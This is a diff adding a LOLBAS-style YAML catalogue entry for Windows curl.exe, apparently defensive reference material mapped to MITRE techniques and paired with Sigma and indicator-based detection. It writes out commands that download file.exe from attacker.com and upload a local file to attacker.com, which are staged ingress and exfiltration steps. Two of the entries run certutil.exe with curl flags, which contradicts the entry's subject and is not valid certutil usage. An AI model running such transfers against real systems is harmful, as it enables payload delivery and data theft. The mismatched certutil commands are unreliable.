@@ -1,0 +1,49 @@
+---
+Name: curl.exe # PE original filename curl.exe
+Description: command-line tool for making HTTP requests and transferring data to and from web servers
+Author: 'Ekitji'
+Created: 2023-10-07
+Commands:
+  - Command: curl.exe http://attacker.com/file.exe -o file.exe
+    Description: Download and save file.exe to disk in the current folder.
+    Usecase: Download file from Internet.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+  - Command: certutil.exe http://attacker.com/file.exe --output file.exe
+    Description: Download and save file.exe to disk in the current folder.
+    Usecase: Download file from Internet.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+  - Command: curl.exe http://attacker.com/upload -T file.exe
+    Description: Upload file to destination.
+    Usecase: Upload file to destination.
+    Category: Upload
+    Privileges: User
+    MitreID: T1567
+    OperatingSystem: Windows 10, Windows 11
+  - Command: certutil.exe http://attacker.com/upload --upload-file file.exe
+    Description: Upload file to destination.
+    Usecase: Upload file to destination
+    Category: Upload
+    Privileges: User
+    MitreID: T1567
+    OperatingSystem: Windows 10, Windows 11
+Full_Path:
+  - Path: C:\Windows\System32\curl.exe
+  - Path: C:\Windows\SysWOW64\curl.exe
+Code_Sample:
+  - Code:
+Detection:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_curl_susp_download.yml
+  - IOC: curl.exe creating new files on disk
+  - IOC: Useragent curl/7.83.1
+  - IOC: event.id 4688 process creation of curl.exe
+Resources:
+
+Acknowledgement:
+  - Person: Ekitji
+    Handle: '@eki_erk'
